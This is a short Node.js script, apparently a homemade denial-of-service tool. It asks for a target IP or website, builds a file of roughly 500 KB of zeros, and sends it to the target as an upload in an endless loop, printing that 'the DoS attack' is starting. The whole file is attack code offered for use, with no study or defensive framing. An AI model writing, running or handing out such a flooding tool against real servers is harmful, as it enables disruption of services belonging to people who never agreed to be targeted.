let requests = require('request');
let readline = require('readline-sync');
let fs = require('fs-extra');

console.log('ip (1)');
console.log('web adress (2)');
let ifip = readline.question('> ');

if(ifip == "1"){

let ip = readline.question("Ip adress : ");

let infinity = 1;

console.log();
console.log('The DoS attack file is creating, be patient...');

let data = "0"

for (let i = 0; i < 100000; i++) {
    data += "00000"
}

console.log();
console.log('Attack file ready, now starting the attack...');

fs.writeFileSync('file.txt', data);

const formData = {
  custom_file: {
    value:  fs.createReadStream('file.txt'),
    options: {
      filename: 'zb.txt',
      contentType: 'multipart/form-data'
    }
  }
};

for (let i = 0; i < infinity; i+=1) {
    let url = "http://" + ip + "/";
    requests({url: url, formData: formData},)
      console.log(i)
      infinity = infinity + 1;
    }
} else if(ifip == "2") {
let ip = readline.question("website adress (with http://...) : ");

let infinity = 1;

console.log();
console.log('The DoS attack file is creating, be patient...');

let data = "0"

for (let i = 0; i < 100000; i++) {
    data += "00000"
}

console.log();
console.log('Attack file ready, now starting the attack...');

fs.writeFileSync('file.txt', data);

const formData = {
  custom_file: {
    value:  fs.createReadStream('file.txt'),
    options: {
      filename: 'zb.txt',
      contentType: 'multipart/form-data'
    }
  }
};

for (let i = 0; i < infinity; i+=1) {
    let url = ip;
    requests({url: url, formData: formData},)
      console.log(i)
      infinity = infinity + 1;
    }
} else {
return "Not available";
}
